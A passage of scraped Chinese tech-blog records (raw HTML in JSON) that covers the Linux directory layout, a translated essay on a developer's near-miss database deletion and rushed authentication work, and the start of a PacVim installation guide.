是库文件所在的地方。库是包含应用程序可以使用的代码文件。它们包含应用程序用于在桌面上绘制窗口、控制外围设备或将文件发送到硬盘的代码片段。</p>\n<p>在文件系统周围散布着更多的 <code>lib</code> 目录，但是这个直接挂载在 <code>/</code> 的 <code>/lib</code> 目录是特殊的，除此之外，它包含了所有重要的内核模块。 内核模块是使你的显卡、声卡、WiFi、打印机等工作的驱动程序。</p>\n<h4 id=\"toc_9\">/media</h4>\n<p>在 <code>/media</code> 目录中，当你插入外部存储器试图访问它时，将自动挂载它。与此列表中的大多数其他项目不同，<code>/media</code> 并不追溯到 1970 年代，主要是因为当计算机正在运行而动态地插入和检测存储（U 盘、USB 硬盘、SD 卡、外部 SSD 等)，这是近些年才发生的事。</p>\n<h4 id=\"toc_10\">/mnt</h4>\n<p>然而，<code>/mnt</code> 目录是一些过去的残余。这是你手动挂载存储设备或分区的地方。现在不常用了。</p>\n<h4 id=\"toc_11\">/opt</h4>\n<p><code>/opt</code> 目录通常是你编译软件（即，你从源代码构建，并不是从你的系统的软件库中安装软件）的地方。应用程序最终会出现在 <code>/opt/bin</code> 目录，库会在 <code>/opt/lib</code> 目录中出现。</p>\n<p>稍微的题外话：应用程序和库的另一个地方是 <code>/usr/local</code>，在这里安装软件时，也会有 <code>/usr/local/bin</code> 和 <code>/usr/local/lib</code> 目录。开发人员如何配置文件来控制编译和安装过程，这就决定了软件安装到哪个地方。</p>\n<h4 id=\"toc_12\">/proc</h4>\n<p><code>/proc</code>，就像 <code>/dev</code> 是一个虚拟目录。它包含有关你的计算机的信息，例如关于你的 CPU 和你的 Linux 系统正在运行的内核的信息。与 <code>/dev</code> 一样，文件和目录是在计算机启动或运行时生成的，因为你的系统正在运行且会发生变化。</p>\n<h4 id=\"toc_13\">/root</h4>\n<p><code>/root</code> 是系统的超级用户（也称为“管理员”）的主目录。 它与其他用户的主目录是分开的，<strong>因为你不应该动它</strong>。 所以把自己的东西放在你自己的目录中，伙计们。</p>\n<h4 id=\"toc_14\">/run</h4>\n<p><code>/run</code> 是另一个新出现的目录。系统进程出于自己不可告人的原因使用它来存储临时数据。这是另一个<strong>不要动它</strong>的文件夹。</p>\n<h4 id=\"toc_15\">/sbin</h4>\n<p><code>/sbin</code> 与 <code>/bin</code> 类似，但它包含的应用程序只有超级用户（即首字母的 <code>s</code> ）才需要。你可以使用 <code>sudo</code> 命令使用这些应用程序，该命令暂时允许你在许多 Linux 发行版上拥有超级用户权限。<code>/sbin</code> 目录通常包含可以安装、删除和格式化各种东西的工具。你可以想象，如果你使用不当，这些指令中有一些是致命的，所以要小心处理。</p>\n<h4 id=\"toc_16\">/usr</h4>\n<p><code>/usr</code> 目录是在 UNIX 早期用户的主目录所处的地方。然而，正如我们上面看到的，现在 <code>/home</code> 是用户保存他们的东西的地方。如今，<code>/usr</code> 包含了大量目录，而这些目录又包含了应用程序、库、文档、壁纸、图标和许多其他需要应用程序和服务共享的内容。</p>\n<p>你还可以在 <code>/usr</code> 目录下找到 <code>bin</code>，<code>sbin</code>，<code>lib</code> 目录，它们与挂载到根目录下的那些有什么区别呢？现在的区别不是很大。在早期，<code>/bin</code> 目录（挂载在根目录下的）只会包含一些基本的命令，例如 <code>ls</code>、<code>mv</code> 和 <code>rm</code> ；这是一些在安装系统的时候就会预装的一些命令，用于维护系统的一个基本的命令。 而 <code>/usr/bin</code> 目录则包含了用户自己安装和用于工作的软件，例如文字处理器，浏览器和一些其他的软件。</p>\n<p>但是许多现代的 Linux 发行版只是把所有的东西都放到 <code>/usr/bin</code> 中，并让 <code>/bin</code> 指向 <code>/usr/bin</code>，以防彻底删除它会破坏某些东西。因此，Debian、Ubuntu 和 Mint 仍然保持 <code>/bin</code> 和 <code>/usr/bin</code> （和 <code>/sbin</code> 和 <code>/usr/sbin</code> ）分离；其他的，比如 Arch 和它衍生版，只是有一个“真实”存储二进制程序的目录，<code>/usr/bin</code>，其余的任何 <code>bin</code> 目录是指向 <code>/usr/</code>bin 的“假”目录。</p>\n<h4 id=\"toc_17\">/srv</h4>\n<p><code>/srv</code> 目录包含服务器的数据。如果你正在 Linux 机器上运行 Web 服务器，你网站的 HTML文件将放到 <code>/srv/http</code>（或 <code>/srv/www</code>）。 如果你正在运行 FTP 服务器，则你的文件将放到 <code>/srv/ftp</code>。</p>\n<h4 id=\"toc_18\">/sys</h4>\n<p><code>/sys</code> 是另一个类似 <code>/proc</code> 和 <code>/dev</code> 的虚拟目录，它还包含连接到计算机的设备的信息。</p>\n<p>在某些情况下，你还可以操纵这些设备。 例如，我可以通过修改存储在 <code>/sys/devices/pci0000:00/0000:00:02.0/drm/card1/card1-eDP-1/intel_backlight/brightness</code> 中的值来更改笔记本电脑屏幕的亮度（在你的机器上你可能会有不同的文件）。但要做到这一点，你必须成为超级用户。原因是，与许多其它虚拟目录一样，在 <code>/sys</code> 中打乱内容和文件可能是危险的，你可能会破坏系统。直到你确信你知道你在做什么。否则不要动它。</p>\n<h4 id=\"toc_19\">/tmp</h4>\n<p><code>/tmp</code> 包含临时文件，通常由正在运行的应用程序放置。文件和目录通常（并非总是）包含应用程序现在不需要但以后可能需要的数据。</p>\n<p>你还可以使用 <code>/tmp</code> 来存储你自己的临时文件 —— <code>/tmp</code> 是少数挂载到根目录下而你可以在不成为超级用户的情况下与它进行实际交互的目录之一。</p>\n<h4 id=\"toc_20\">/var</h4>\n<p><code>/var</code> 最初被如此命名是因为它的内容被认为是可变的variable，因为它经常变化。今天，它有点用词不当，因为还有许多其他目录也包含频繁更改的数据，特别是我们上面看到的虚拟目录。</p>\n<p>不管怎样，<code>/var</code> 目录包含了放在 <code>/var/log</code> 子目录的日志文件之类。日志是记录系统中发生的事件的文件。如果内核中出现了什么问题，它将被记录到 <code>/var/log</code> 下的文件中；如果有人试图从外部侵入你的计算机，你的防火墙也将记录尝试。它还包含用于任务的假脱机程序。这些“任务”可以是你发送给共享打印机必须等待执行的任务，因为另一个用户正在打印一个长文档，或者是等待递交给系统上的用户的邮件。</p>\n<p>你的系统可能还有一些我们上面没有提到的目录。例如，在屏幕截图中，有一个 <code>/snap</code> 目录。这是因为这张截图是在 Ubuntu 系统上截取的。Ubuntu 最近将 <a href=\"https://www.ubuntu.com/desktop/snappy\">snap</a> 包作为一种分发软件的方式。<code>/snap</code> 目录包含所有文件和从 snaps 安装的软件。</p>\n<h3 id=\"toc_21\">更深入的研究</h3>\n<p>这里仅仅谈了根目录，但是许多子目录都指向它们自己的一组文件和子目录。图 2 给出了基本文件系统的总体概念（图片是在 Paul Gardner 的 CC BY-SA 许可下提供的），<a href=\"https://en.wikipedia.org/wiki/Unix_filesystem#Conventional_directory_layout\">Wikipedia 对每个目录的用途进行了总结</a>。</p>\n<p><img class=\"aligncenter\" title=\"filesystem\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/fe6ae1c96f1282575403c8fd4706830f.png\" alt=\"filesystem\"></p>\n<p style=\"text-align: center\"><em>图 2：标准 Unix 文件系统</em></p>\n<p>要自行探索文件系统，请使用 <code>cd</code> 命令：<code>cd</code>将带你到你所选择的目录（ <code>cd</code> 代表更改目录）。</p>\n<p>如果你不知道你在哪儿，<code>pwd</code>会告诉你，你到底在哪里，（ <code>pwd</code> 代表打印工作目录 ），同时 <code>cd</code>命令在没有任何选项或者参数的时候，将会直接带你到你自己的主目录，这是一个安全舒适的地方。</p>\n<p>最后，<code>cd ..</code>将会带你到上一层目录，会使你更加接近根目录，如果你在 <code>/usr/share/wallpapers</code> 目录，然后你执行 <code>cd ..</code> 命令，你将会跳转到 <code>/usr/share</code> 目录</p>\n<p>要查看目录里有什么内容，使用 <code>ls</code> 或这简单的使用 <code>l</code> 列出你所在目录的内容。</p>\n<p>当然，你总是可以使用 <code>tree</code> 来获得目录中内容的概述。在 <code>/usr/share</code> 上试试——里面有很多有趣的东西。</p>\n<h3 id=\"toc_22\">总结</h3>\n<p>尽管 Linux 发行版之间存在细微差别，但它们的文件系统的布局非常相似。 你可以这么说：一旦你了解一个，你就会都了解了。 了解文件系统的最好方法就是探索它。 因此，伴随 <code>tree</code> ，<code>ls</code> 和 <code>cd</code> 进入未知的领域吧。</p>\n<p>你不会只是因为查看文件系统就破坏了文件系统，因此请从一个目录移动到另一个目录并进行浏览。 很快你就会发现 Linux 文件系统及其布局的确很有意义，并且你会直观地知道在哪里可以找到应用程序，文档和其他资源。</p>\n<p>通过 Linux 基金会和 edX 免费的 “<a href=\"https://training.linuxfoundation.org/linux-courses/system-administration-training/introduction-to-linux\">Linux入门</a>” 课程了解更多有关 Linux 的信息。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114189\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114189votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114189\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114189/", "url_obj_id": "b712fbfeffbfaff779433029fcdbb8d8"}
{"front_img_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1fsrtjp2o93j20hs0audih.jpg"], "title": "我作为开发者犯过的两次愚蠢的错误", "create_date": "2018/06/29 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/dimple11\">dimple11</a> 翻译，<a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.freecodecamp.org/the-times-ive-messed-up-as-a-developer-3c0bcaa1afd6\">Zachary Kuhn</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>上周我和同事们简单地聊了聊我们工作中搞砸的那些事儿。如今早已不再犯那些错了，所以想起过去就觉得很好笑。但是笑归笑，其实当时犯的这些错让我们受益颇深。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fsrtjp2o93j20hs0audih.jpg\" width=\"640\" height=\"390\"></p>\n<p style=\"text-align: center;\">（credit：Snecx）</p>\n<p>分享自己犯错的经历至关重要，能让别人从中吸取经验教训，而且可能让他们工作起来更上手。我在这儿记录了几条自己最近犯的错。</p>\n<h3>为什么有那么多生产数据库被误删？</h3>\n<p>几个月之前，Reddit 上发了一篇<a href=\"https://www.reddit.com/r/cscareerquestions/comments/6ez8ag/accidentally_destroyed_production_database_on/\">文章</a>，写的是一个入门级开发人员在上班第一天就误删了生产数据库。我们看到类似这种有人犯了特大的、不可磨灭的错误的文章，都不免心生畏惧。我们意识到自己并不是没可能犯那种错——大多数时候都是悬崖勒马。</p>\n<p>我在干第一份工作的时候，有一个高级数据库管理员在上班第一天就误删了生产数据库，这种例子简直比比皆是。工作团队用一周前旧的数据库备份帮他弥补了过失，让他保住了工作。如今十年过去了，都仍用这件事拿他开涮。</p>\n<p>今年年初有天早上，我被叫去调查一个客户生产中出现的问题。他们本来要针对一小部分用户进行产品的 β 测试，但是他们的网站首页突然什么都显示不出来了。我猜想可能是系统有 bug 或者有漏洞所致。</p>\n<p>我登录进生产机器，调出数据库，发现 articles 表是空的。OK，这证实了网页显示空白的情况。</p>\n<p>用户表里面还是有用户的，这就奇怪了，所以我们丢了所有的 articles，但起码他们的测试用户仍有他们的账号，我们可以解释说是这是个测试版，而且这种事情时有发生。</p>\n<p>接下来一会儿我就犯迷糊了。我记不清楚自己干了什么，我认为自己不会蠢到在控制台窗口输入了删除表中用户的指令，可情况就是这样——现在既没有 articles 表，也没有用户表。我呆坐着，感觉有点震惊。</p>\n<p>然后我的大脑高速运转，开始想办法修复问题。我真的删掉用户表了吗？是的。我们运行备份数据库了吗？没有。该怎么向客户解释呢？我不知道。</p>\n<p>我记得自己去找了项目经理，坐在她旁边解释事情发生的经过，articles 表中没有数据了，所以网站看上去是空的。哦对了，我还误删了用户表。现在他们需要重新邀请所有的用户——如果他们还能想清楚用户都有谁的话。哎呀。</p>\n<p>我回到自己的座位上，感觉深受挫败。</p>\n<p><strong>但是我觉得事情有些蹊跷，我们怎么可能一开始就丢了所有的 articles 表呢？</strong>于是我继续深究下去，一方面是因为难以接受这个结果，一方面是想挽回颜面。之后过了一小会儿，我注意到了关键问题。</p>\n<p>服务器上还有另外 5 个数据库，其中一个的名字和我正在看的那个数据库的名字非常相似。</p>\n<p>我一检查，发现 articles 都在里面，用户表也完好无损。事实证明是因为配置发生变化，无意间让它变成了生产数据库，导致网站指向了全新的数据库。我在里面看到的那些用户呢？种子数据罢了。</p>\n<p>真是如释重负！一早上神经紧绷、胃酸翻涌，搞得我浑身不适，但好在我们“修复”了所有的数据，并且找到了问题真正的症结所在，没有提前宣布误删数据库的坏消息。</p>\n<p>这个小插曲让我们受益良多，最简单的一个就是：现在我们总是在给数据库做备份……这可能是我们开发人员最有效的胃药。</p>\n<h3>总赶进度，却从来赶不上进度</h3>\n<p>我最近所犯的另一个突出 错误没那么戏剧化，实际上是由一个个小错误最终累积造成了大麻烦。</p>\n<p>我们项目开发的一大挑战就是时间紧张（但也不全是？）</p>\n<p>第一次开会时，我们一致觉得项目需要的时间比我们能够拿出来的时间多了一倍。从项目一开始，截止日期就步步紧逼，所以我们三下五除二就通过了认证环节，以便进入客户真正关心的功能环节。</p>\n<p>我只是之前在一个单页 app 中落实了一次认证，但仍然没有彻底理解 app 各部分是如何协调的。</p>\n<p>尽己所能用最快的速度把 app 赶出来，就是大错特错，<strong>我漏掉了一些非常重要的东西：</strong></p>\n<ol>\n<li>用户在登陆后，是通过 cookie 来加载的，但是我的 app 页面没有给加载提供等待时间，而是根据事件顺序来决定先后的，所以服务器会回复说你没有权限。这种错误很少见，而且很难再出现，因为大多数情况下事件都是按照正确的顺序来完成的。</li>\n<li>而且认证环节也从不检查用户令牌是否失效，如果你不经常访问网站，当发现了没法登上网站后，就需要注销登录再重新登进去。</li>\n<li>令牌应该在每次发起请求时都进行更新，但我从来都没有时间去理解这些规则。所以这里又产生了时间问题。如果我们一次同时发出几种请求，收到的回复取决于他们到来的顺序，那将来发送请求用到的令牌就是错的。</li>\n</ol>\n<p>我们卯足劲赶进度，但最终所用的时间还是要比给定的时间多一倍。区别就是我们开发出的 app 里面漏洞更多了，然后甚而要花更多的时间对漏洞进行追踪和修复。</p>\n<p>工作中的失误让我尴尬不已，在大家面前感到十分羞愧，因为我把一切都搞砸了。</p>\n<p>我要说一点：从那之后，我开始花时间学习认证机制，现在已经理解了 OAuth,、JWT、刷新令牌和失效。我仔细阅读了许多库里别人写的认证代码，而且建立了基于几种不同语言版本和框架的认证流程。</p>\n<h3>失败是成功之母</h3>\n<p>这是每次失败的经历给予我的启发。只要你愿意学习，几乎每次这样的经历都会让你从中受益。</p>\n<p>如果人能够从错误中吸取教训，那么就会有所进步。如果一个队员是第一次犯错，我尽量不会对他表现出不满态度，他们往往已经知道自己把事情搞糟了。</p>\n<p>但我也努力不去苛责那些总是犯错、屡教不改的人，他们也需要被同情。</p>\n<p>对待犯错，如果你能够做到这四点，那么就会不断进步：</p>\n<ul>\n<li>对曾经犯过的错误可以自嘲一番</li>\n<li>从中吸取经验教训</li>\n<li>在之后努力为自己正名</li>\n<li>和他人分享，让他人也能从中获益。</li>\n</ul>\n<p>关于犯错的宝贵价值，我留给你们一则名人轶事：20 世纪初期，IBM 的总裁托马斯·J·沃森遇到了一位因为多次决策错误让公司损失惨重的员工，当问及是否要开除这个员工时，沃森答道：</p>\n<blockquote><p>“不，我刚刚花了 60 万美元培训了他，我怎么会让其他人雇佣他来获得他的经历呢？”</p></blockquote>\n<p>你过去犯过哪些有意思的错？来一起分享吧！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114164\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114164votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114164\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">dimple11</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/09/28db3e36f17643a752be4b798d5ceabc.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/dimple11\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/dimple11/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 15</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,程序员,职场", "url": "http://blog.jobbole.com/114164/", "url_obj_id": "6ef1af433054de7bb42416cdfc0fbfd8"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/57beea594a88813722998ea81bc96125.png"], "title": "PacVim：一个学习 vim 命令的命令行游戏", "create_date": "2018/06/19 ·", "praise_num": 1, "fav_num": 1, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/pacvim-a-cli-game-to-learn-vim-commands/\">Sk</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9738-1.html?pr\">Linux中国/geekpi</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/57beea594a88813722998ea81bc96125.png\" alt=\"\"></p>\n<p>你好，Vim用户！今天，我偶然发现了一个很酷的程序来提高 Vim 的使用技巧。Vim 是编写和编辑代码的绝佳编辑器。然而，你们中的一些人（包括我）仍在陡峭的学习曲线中挣扎。再也不用了！来看看 <strong>PacVim</strong>，一款可帮助你学习 Vim 命令的命令行游戏。PacVim 的灵感来源于经典游戏 <a href=\"https://en.wikipedia.org/wiki/Pac-Man\">PacMan</a>，它以一种好玩有趣的方式为你提供了大量的 Vim 命令练习。简而言之，PacVim 是一种深入了解 vim 命令的有趣而自由的方式。请不要将 PacMan 与 <a href=\"https://www.ostechnix.com/getting-started-pacman/\">pacman</a> （arch Linux 包管理器）混淆。 PacMan 是 20 世纪 80 年代发布的经典流行街机游戏。</p>\n<p>在本简要指南中，我们将看到如何在 Linux 中安装和使用 PacVim。</p>\n<h3 id=\"toc_1\">安装 PacVim</h3>\n<p>首先按如下链接安装 <strong>Ncurses</strong> 库和<strong>开发工具</strong>。</p>\n<ul>\n<li><a href=\"https://www.ostechnix.com/how-to-install-ncurses-library-in-linux/\">如何在 Linux 中安装 Ncurses 库</a></li>\n<li><a href=\"https://www.ostechnix.com/install-development-tools-linux/\">如何在 Linux 中安装开发工具</a></li>\n</ul>\n<p>请注意，如果没有 gcc 4.8.X 或更高版本，这款游戏可能无法正确编译和安装。我在 Ubuntu 18.04 LTS 上测试了 PacVim，并且完美运行。</p>\n<p>安装 Ncurses 和 gcc 后，运行以下命令来安装 PacVim。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752cc606a244025676\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git clone https://github.com/jmoon018/PacVim.git\r\n$ cd PacVim\r\n$ sudo make install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752cc606a244025676-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752cc606a244025676-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a752cc606a244025676-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752cc606a244025676-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752cc606a244025676-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/jmoon018/PacVim.git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752cc606a244025676-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd </span><span class=\"crayon-i\">PacVim</span></div><div class=\"crayon-line\" id=\"crayon-5b4a752cc606a244025676-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">make </span><span class=\"crayon-i\">install</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752cc606a244025676-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">使用 PacVim 学习 Vim 命令</h3>\n<h4 id=\"toc_3\">启动 PacVim 游戏</h4>\n<p>要玩这个游戏，只需运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752cc6073294110282\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim [LEVEL_NUMER] [MODE]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752cc6073294110282-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752cc6073294110282-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752cc6073294110282-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LEVEL_NUMER</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">MODE</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752cc6073294110282-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>例如，以下命令以普通模式启动游戏第 5 关。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752cc6077145567715\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span 